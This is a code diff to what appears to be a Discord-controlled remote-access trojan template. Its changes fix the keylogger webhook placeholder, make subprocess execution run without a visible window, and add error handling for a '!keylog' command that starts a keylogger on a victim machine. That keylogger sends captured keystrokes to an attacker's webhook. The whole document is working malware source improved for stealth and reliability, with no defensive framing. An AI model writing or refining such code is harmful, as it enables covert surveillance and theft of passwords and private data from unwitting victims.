@@ -21,7 +21,7 @@ KEYLOG = {KEYLOG}
 
 BOT_TOKEN = "{BOT_TOKEN}"
 TOKEN_WEBHOOK = "{TOKEN_WEBHOOK}"
-KEYLOGGER_WEBHOOK = "{KEYLOGGER_TOKEN}"
+KEYLOGGER_WEBHOOK = "{KEYLOGGER_WEBHOOK}"
 
 SCREENSHOTS_ID = {SCREENSHOTS_ID}
 DOWNLOADS_ID = {DOWNLOADS_ID}
@@ -155,7 +155,7 @@ except Exception:
 @client.command(name='process',pass_context=True)
 async def process(context):
     command = context.message.content.replace("!process ", "")
-    result = sp.getoutput("tasklist")
+    result = sp.Popen("tasklist", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
     out, err = result.communicate()
     result.wait()
     word_list = command.split()
@@ -249,8 +249,8 @@ async def keylog(context):
                 interval = word_list[1]
                 keyloggerr = keylogger.Keylogger(interval=int(interval), ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
                 keyloggerr.start()
-            except KeyboardInterrupt:
-                exit()
+            except IndexError:
+                my_embed = discord.Embed(title=f"Error while starting Keylogger on Agent#{ID}\nMake sure you have specified all the required parameters", color=0xFF0000)
         try:
             threading.Thread(target=keylogger_start).start()
             my_embed = discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00)
